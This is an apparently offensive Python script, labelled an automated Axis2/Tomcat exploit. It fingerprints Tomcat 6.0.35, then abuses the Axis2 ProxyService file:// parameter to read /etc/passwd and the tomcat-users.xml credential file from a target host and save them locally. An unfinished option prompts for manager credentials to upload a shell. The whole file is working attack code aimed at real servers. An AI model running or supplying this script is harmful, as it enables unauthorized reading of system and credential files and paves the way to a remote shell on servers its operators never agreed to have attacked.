#!/usr/bin/env python

import argparse
import requests
import re
import os

parser = argparse.ArgumentParser(description='Automated axis2/TomCat exploit.')
parser.add_argument('host', metavar='N', help='The apache/tomcat host you want to run the script against')
parser.add_argument('--shell-prompt', metavar='N', dest='shellprompt', type=bool, help='Conduct auto shell upload if you have applicable creds')
parser.set_defaults(shellprompt=False)
args = parser.parse_args()
targethost = args.host
shellprompt = args.shellprompt

initial_req = requests.get(url = "http://"+targethost+"/I_dont_exist")

at_version = initial_req.content
match_tags = "<h3></h3>"
match_pattern = "(<h3>)(.*?)(</h3>)"
vuln_match=re.search(match_pattern, at_version)
vuln_vers = vuln_match.group(2)

if(vuln_vers == "Apache Tomcat/6.0.35"):
    print("Host Looks Vulnerable")
    print("Checking Axis2 Endpoints")
    print("________________________\n")

    initial_axis2_req = requests.get(url = "http://"+targethost+"/axis2/services/listServices")
    print(initial_axis2_req.url)
    print(initial_axis2_req.status_code)
    if(initial_axis2_req.status_code == 200):
        print("Succesfully listed services")
        print("_____________________\n")
        print("Testing PoxyService Params..\n")
        get_etc_passwd = requests.get(url = "http://"+targethost+"/axis2/services/ProxyService/get?uri=file:///etc/passwd")
        if(get_etc_passwd.status_code == 200):
            get_etc_passwd_dir = "/tmp/"+targethost+"/"
            if not os.path.exists(get_etc_passwd_dir):
                os.makedirs(get_etc_passwd_dir)
            with open(get_etc_passwd_dir + targethost+"_passwd.txt", "w") as f:
                f.write(get_etc_passwd.content)
                f.close()
            print("Success.. Dumping target passwd file to " + get_etc_passwd_dir+targethost+"_passwd.txt")
            print("________________\n")
            get_tom_users = requests.get("http://"+targethost+"/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml")
            get_tom_users_dir = "/tmp/"+targethost+"/" 
            with open(get_tom_users_dir + targethost+"_Tomcat_users.xml","w") as x:
                x.write(get_tom_users.content)
                x.close()
            print("Dumping TomCat users to "+get_tom_users_dir+targethost+"_TomCat_users.xml")
            print("________________\n")

            if(shellprompt == True):
                print("\n***************")
                print(" What the shell ")
                print("*************** \n")
                tcat_username = raw_input ("TomCat Username: ")
                tcat_pass = raw_input ("TomCat Password: ")
                tcat_endpoint = raw_input ("Manager Endpoint: ")

    else:
        print("could not list axis2 services!")
else:
    print("Host does not look vlun! sadface")
